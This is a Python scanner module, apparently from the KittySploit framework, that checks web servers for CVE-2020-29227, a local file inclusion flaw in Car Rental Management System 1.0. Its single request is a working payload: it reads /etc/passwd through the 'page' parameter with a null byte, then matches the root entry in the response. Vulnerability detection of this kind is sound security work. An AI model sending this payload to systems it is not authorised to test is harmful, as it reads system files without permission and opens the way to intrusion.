#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Car Rental Management System 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Car Rental Management System 1.0 - Local File Inclusion Detection',
        'description': 'Car Rental Management System 1.0 allows an unauthenticated user to perform a file inclusion attack against the /index.php file with a partial filename in the "page" parameter, leading to code execution.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'lfi', 'car_rental_management_system_project', 'sqli', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://loopspell.medium.com/cve-2020-29227-unauthenticated-local-file-inclusion-7d3bd2c5c6a5',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-29227',
            'https://www.sourcecodester.com/php/14544/car-rental-management-system-using-phpmysqli-source-code.html',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-29227',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?page=/etc/passwd%00', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="Car Rental Management System 1.0 - Local File Inclusion detected",
                path='/index.php?page=/etc/passwd%00',
            )
            return True
        return False

